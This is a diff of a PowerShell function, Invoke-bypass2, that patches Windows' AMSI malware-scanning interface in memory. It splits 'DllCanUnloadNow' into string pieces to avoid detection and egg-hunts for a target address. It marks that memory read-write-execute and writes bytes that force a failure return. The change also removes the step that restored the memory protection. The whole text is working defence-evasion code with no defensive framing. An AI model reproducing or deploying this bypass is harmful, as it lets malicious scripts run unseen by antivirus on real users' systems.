@@ -86,11 +86,10 @@ function Invoke-bypass2 {
 		$dllCanUnloadNowAddress = [K2]::gpa($hModule, "Dll"+"Can"+"Unload"+"Now")
 		[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
 		$p = 0
-		[K2]::vp($targetedAddress, [uint32]2, 0x4, [ref]$p) | Out-Null
+		[K2]::vp($targetedAddress, [uint32]2, 0x40, [ref]$p) | Out-Null
 		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)
 		
 		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 7)
-		$b=0
-		[K2]::vp($targetedAddress, [uint32]2, $p, [ref]$b) | Out-Null
+
     }
 }
